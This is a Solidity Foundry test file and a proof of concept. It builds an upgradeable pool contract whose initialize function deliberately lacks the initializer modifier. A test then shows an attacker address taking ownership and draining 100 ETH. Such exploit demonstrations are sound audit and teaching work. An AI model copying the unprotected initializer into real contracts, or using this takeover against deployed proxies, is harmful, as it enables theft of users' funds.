// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// OpenZeppelin Upgradeable
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/ERC1967/ERC1967Proxy.sol";

contract BrokenWithdrawPool is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    address public clearinghouse;
    address public verifier;

    // BUG: NO initializer modifier → anyone can call this!
    function initialize(address _clearinghouse, address _verifier) external {
        __Ownable_init();
        __UUPSUpgradeable_init();
        clearinghouse = _clearinghouse;
        verifier = _verifier;
    }

    function emergencyWithdrawAllETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function _authorizeUpgrade(address) internal override onlyOwner {}

    receive() external payable {}
}

contract WithdrawPoolExploitTest is Test {
    BrokenWithdrawPool impl;
    ERC1967Proxy proxy;
    BrokenWithdrawPool pool;

    address attacker = address(0xBAD);
    address deployer = address(0xBEEF);

    function setUp() public {
        vm.startPrank(deployer);

        impl = new BrokenWithdrawPool();
        proxy = new ERC1967Proxy(address(impl), "");
        pool = BrokenWithdrawPool(address(proxy));

        // Send 100 ETH to the pool so attacker can steal it
        payable(address(pool)).transfer(100 ether);

        console.log("Pool deployed at:", address(pool));
        console.log("Initial owner (should be 0):", pool.owner());

        vm.stopPrank();
    }

    function test_AttackerTakesOwnershipAndDrains() public {
        vm.startPrank(attacker);

        // EXPLOIT: Anyone can become owner
        pool.initialize(address(0x1), address(0x2));

        console.log("After exploit → Owner is attacker:", pool.owner());
        assertEq(pool.owner(), attacker);

        uint256 balBefore = attacker.balance;
        pool.emergencyWithdrawAllETH();
        uint256 balAfter = attacker.balance;

        console.log("Attacker stole:", (balAfter - balBefore) / 1e18, "ETH");

        assertEq(balAfter - balBefore, 100 ether);
        vm.stopPrank();
    }
}